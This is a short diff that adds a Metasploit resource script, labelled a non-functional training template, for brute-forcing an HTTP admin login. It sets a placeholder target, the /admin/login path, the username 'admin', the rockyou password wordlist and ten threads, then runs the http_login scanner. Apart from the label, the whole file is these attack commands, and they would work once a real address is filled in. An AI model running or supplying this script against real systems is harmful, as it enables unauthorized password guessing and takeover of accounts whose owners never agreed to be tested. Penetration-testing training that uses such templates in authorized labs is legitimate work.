@@ -1,0 +1,11 @@
+# HTTP Brute Force Template
+# For Training Use – Non-functional Template
+
+use auxiliary/scanner/http/http_login
+set RHOSTS <TARGET_IP>
+set RPORT 80
+set AUTH_URI /admin/login
+set USERNAME admin
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+set THREADS 10
+run
